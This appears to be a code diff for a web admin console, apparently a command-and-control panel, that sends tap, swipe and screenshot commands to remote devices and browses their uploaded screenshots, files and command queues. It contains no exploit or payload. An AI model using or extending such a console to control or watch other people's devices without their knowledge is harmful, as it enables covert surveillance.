+  const sy = Math.round(_pickerStartY / img.naturalHeight * rect.height);
+  const dist = Math.abs(c.px-sx)+Math.abs(c.py-sy);
+  const autoSend = document.getElementById('pickerAutoSend').checked && c2ActiveDeviceId;
+  if (dist <= 10) {
+    // 点击
+    if (document.getElementById('tapX')) document.getElementById('tapX').value = c.devX;
+    if (document.getElementById('tapY')) document.getElementById('tapY').value = c.devY;
+    document.getElementById('coordPickerCoords').textContent = `✓ 已选坐标 (${c.devX}, ${c.devY}) — 设备分辨率 ${img.naturalWidth}×${img.naturalHeight}`;
+    if (autoSend) {
+      api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_tap',payload:{x:c.devX,y:c.devY}})})
+        .then(r => document.getElementById('coordPickerCoords').textContent = r.ok ? `✓ 已发送点击 (${c.devX},${c.devY})` : '发送失败: '+(r.message||''));
+    }
+  } else {
+    // 滑动
+    ['swX1','swY1','swX2','swY2'].forEach((f,i)=>{const el=document.getElementById(f);if(el)el.value=[_pickerStartX,_pickerStartY,c.devX,c.devY][i];});
+    document.getElementById('coordPickerCoords').textContent = `✓ 已选滑动路径 (${_pickerStartX},${_pickerStartY})→(${c.devX},${c.devY})`;
+    if (autoSend) {
+      const dur = Number((document.getElementById('swDur')||{}).value)||300;
+      api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'input_swipe',payload:{x1:_pickerStartX,y1:_pickerStartY,x2:c.devX,y2:c.devY,duration:dur}})})
+        .then(r => document.getElementById('coordPickerCoords').textContent = r.ok ? `✓ 已发送滑动` : '发送失败: '+(r.message||''));
+    }
+  }
+}
+
+async function openRemoteControl() {
+  if (!c2ActiveDeviceId) return;
+  const data = await api(`/admin/api/devices/${c2ActiveDeviceId}/uploads`);
+  const screenshots = (data.uploads||[]).filter(u=>/\.png$/i.test(u.filename));
+  if (!screenshots.length) {
+    const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'screenshot'})});
+    r.ok ? toast('截图命令已发送，等待下次心跳后再试') : alert(r.message||'失败');
+    return;
+  }
+  const res = await fetch(`/admin/api/uploads/${screenshots[0].filename}`,{headers:{Authorization:'Bearer '+token}});
+  if (!res.ok) { toast('加载截图失败'); return; }
+  openCoordPicker(URL.createObjectURL(await res.blob()), true);
+  document.getElementById('pickerAutoSend').checked = true;
+}
+
+async function refreshPickerScreenshot() {
+  if (!c2ActiveDeviceId) return;
+  document.getElementById('coordPickerCoords').textContent = '正在下发截图命令...';
+  const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'screenshot'})});
+  if (!r.ok) { document.getElementById('coordPickerCoords').textContent = '截图失败: '+(r.message||''); return; }
+  document.getElementById('coordPickerCoords').textContent = '等待设备截图（心跳间隔内）...';
+  const deadline = Date.now() + 120000;
+  const prevFile = document.getElementById('coordPickerImage').src;
+  const poll = async () => {
+    if (Date.now() > deadline) { document.getElementById('coordPickerCoords').textContent = '等待超时，请手动刷新上传历史'; return; }
+    try {
+      const d = await api(`/admin/api/devices/${c2ActiveDeviceId}/uploads`);
+      const shots = (d.uploads||[]).filter(u=>/\.png$/i.test(u.filename));
+      if (shots.length) {
+        const res2 = await fetch(`/admin/api/uploads/${shots[0].filename}`,{headers:{Authorization:'Bearer '+token}});
+        if (res2.ok) {
+          const blob = await res2.blob();
+          const url = URL.createObjectURL(blob);
+          if (url !== prevFile) {
+            document.getElementById('coordPickerImage').src = url;
+            document.getElementById('coordPickerCoords').textContent = '截图已更新 '+fmt(shots[0].created_at);
+            return;
+          }
+        }
+      }
+    } catch {}
+    setTimeout(poll, 6000);
+  };
+  setTimeout(poll, 10000);
+}
+
+// ---- 总览 Monitor ----
+let monitorAutoTimer = null;
+let monitorAllUploads = [];
+
+async function loadMonitor() {
+  const r = await api('/admin/api/monitor');
+  if (!r.ok) return;
+  // 统计卡片
+  const stats = r.stats || {};
+  document.getElementById('monitorStats').innerHTML = [
+    ['总设备', stats.totalDevices || 0, '#3b82f6'],
+    ['在线设备', stats.onlineDevices || 0, '#10b981'],
+    ['上传文件', stats.totalUploads || 0, '#f59e0b'],
+    ['待执行命令', stats.totalPending || 0, '#ef4444'],
+  ].map(([label, val, color]) => `<div class="panel" style="text-align:center;padding:16px 8px">
+    <div style="font-size:28px;font-weight:700;color:${color}">${val}</div>
+    <div style="font-size:13px;color:#6b7280;margin-top:4px">${label}</div>
+  </div>`).join('');
+
+  // 保存并渲染上传历史
+  monitorAllUploads = r.uploads || [];
+  renderMonitorUploads();
+
+  // 最近截图
+  const screenshots = monitorAllUploads.filter(u => u.type === 'screenshot').slice(0, 20);
+  if (screenshots.length === 0) {
+    document.getElementById('monitorScreenshots').innerHTML = '<div style="color:#9ca3af;font-size:13px">暂无截图</div>';
+  } else {
+    document.getElementById('monitorScreenshots').innerHTML = screenshots.map(u => {
+      const fn = esc(u.filename);
+      const label = esc(u.device_name || u.device_id);
+      const ts = fmt(u.created_at);
+      return `<div style="background:#f8fafc;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden">
+        <img data-src="/admin/api/uploads/${fn}" style="width:100%;height:140px;object-fit:cover;display:block;background:#e5e7eb;cursor:pointer" onclick="viewMonitorImage('/admin/api/uploads/${fn}')" class="auth-img">
+        <div style="padding:6px 8px;font-size:11px;color:#6b7280">${label}<br>${ts}</div>
+      </div>`;
+    }).join('');
+    loadAuthImages();
+  }
+
+  // 待执行命令
+  const pending = r.pending || [];
+  if (pending.length === 0) {
+    document.getElementById('monitorPending').innerHTML = '<div style="color:#9ca3af;font-size:13px">暂无待执行命令</div>';
+  } else {
+    document.getElementById('monitorPending').innerHTML = `<table><thead><tr><th>设备</th><th>命令</th><th>参数</th><th>时间</th><th>操作</th></tr></thead><tbody>` +
+      pending.map(c => `<tr>
+        <td>${esc(c.device_name || c.device_id)}</td>
+        <td>${esc(c.type)}</td>
+        <td><pre style="margin:0;font-size:11px;white-space:pre-wrap;max-width:300px">${esc(JSON.stringify(c.payload || {}))}</pre></td>
+        <td>${fmt(c.created_at)}</td>
+        <td><button class="small danger" onclick="clearDeviceCommands(${c.device_id})">清除队列</button></td>
+      </tr>`).join('') +
+      `</tbody></table>`;
+  }
+
+  loadMonitorLogs();
+}
+
+function renderMonitorUploads() {
+  const filter = document.getElementById('monitorTypeFilter').value;
+  const uploads = monitorAllUploads.filter(u => !filter || u.type === filter);
+  if (uploads.length === 0) {
+    document.getElementById('monitorUploads').innerHTML = '<div style="color:#9ca3af;font-size:13px">暂无上传记录</div>';
+    return;
+  }
+  document.getElementById('monitorUploads').innerHTML = `<table><thead><tr><th>设备</th><th>类型</th><th>文件名</th><th>大小</th><th>时间</th><th>操作</th></tr></thead><tbody>` +
+    uploads.map(u => {
+      const fn = esc(u.filename);
+      const isImg = /\.(png|jpe?g|gif|webp)$/i.test(u.filename);
+      const preview = isImg
+        ? `<button class="small copy" onclick="viewMonitorImage('/admin/api/uploads/${fn}')">预览</button>`
+        : `<button class="small copy" onclick="viewMonitorText('/admin/api/uploads/${fn}')">查看</button>`;
+      return `<tr>
+        <td>${esc(u.device_name || u.device_id)}</td>
+        <td>${esc(u.type)}</td>
+        <td style="font-size:11px;font-family:monospace">${fn}</td>
+        <td>${u.size ? (u.size/1024).toFixed(1)+'KB' : '-'}</td>
+        <td>${fmt(u.created_at)}</td>
+        <td>${preview}</td>
+      </tr>`;
+    }).join('') +
+    `</tbody></table>`;
+}
+
+async function loadMonitorLogs() {
+  const el = document.getElementById('monitorLogs');
+  el.textContent = '加载中...';
+  try {
+    const r = await api('/admin/api/logs');
+    if (r.ok) { el.textContent = r.logs || '（无日志）'; el.scrollTop = el.scrollHeight; }
+    else el.textContent = r.message || '获取失败';
+  } catch(e) { el.textContent = '获取日志失败: ' + e.message; }
+}
+
+function toggleMonitorAuto() {
+  const checked = document.getElementById('monitorAutoRefresh').checked;
+  clearInterval(monitorAutoTimer);
+  if (checked) monitorAutoTimer = setInterval(loadMonitor, 30000);
+}
+
+function viewMonitorImage(url) {
+  const modal = document.getElementById('modalContent');
+  const img = document.createElement('img');
+  img.style.cssText = 'max-width:100%;max-height:80vh;display:block;margin:0 auto';
+  fetchWithAuth(url).then(blob => { img.src = URL.createObjectURL(blob); });
+  modal.innerHTML = '';
+  modal.appendChild(img);
+  document.getElementById('modalMask').classList.remove('hide');
+}
+
+async function viewMonitorText(url) {
+  const res = await fetch(url, { headers: { Authorization: 'Bearer ' + token } });
+  const text = await res.text();
+  showModal('<pre style="white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:70vh;overflow:auto">' + esc(text) + '</pre>');
+}
+
+function fetchWithAuth(url) {
+  return fetch(url, { headers: { Authorization: 'Bearer ' + token } }).then(r => r.blob());
+}
+
+function loadAuthImages() {
+  document.querySelectorAll('img.auth-img').forEach(img => {
+    const src = img.getAttribute('data-src');
+    if (!src) return;
+    img.removeAttribute('data-src');
+    fetchWithAuth(src).then(blob => { img.src = URL.createObjectURL(blob); }).catch(() => {});
+  });
 }
 
 // ---- helpers ----
